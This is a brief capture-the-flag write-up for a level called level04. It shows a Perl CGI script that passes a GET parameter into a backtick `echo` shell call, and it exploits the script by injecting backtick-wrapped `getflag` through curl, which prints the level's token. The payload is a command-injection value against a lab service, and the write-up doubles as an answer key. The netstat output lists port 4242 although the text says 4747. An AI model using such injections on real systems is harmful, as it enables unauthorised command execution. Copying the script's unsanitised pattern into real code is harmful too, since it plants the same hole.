# level04 solution
Given perl script that starts at localhost at port 4747, takes argument x and prints it with echo

    #!/usr/bin/perl
    # localhost:4747
    use CGI qw{param};
    print "Content-type: text/html\n\n";
    sub x {
      $y = $_[0];
      print `echo $y 2>&1`;
    }
    x(param("x"));

We can check if it runs with netstat command:

    netstat -tuln
    tcp6       0      0 :::4242                 :::*                    LISTEN

We can connect to it via curl and provide argument via GET parameters:

    curl localhost:4747?x=smth
    smth

We can abuse this behaviour by putting backquotes to x so bash will expand it and execute any program we put in between:

    curl localhost:4747?x=\`getflag\`
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
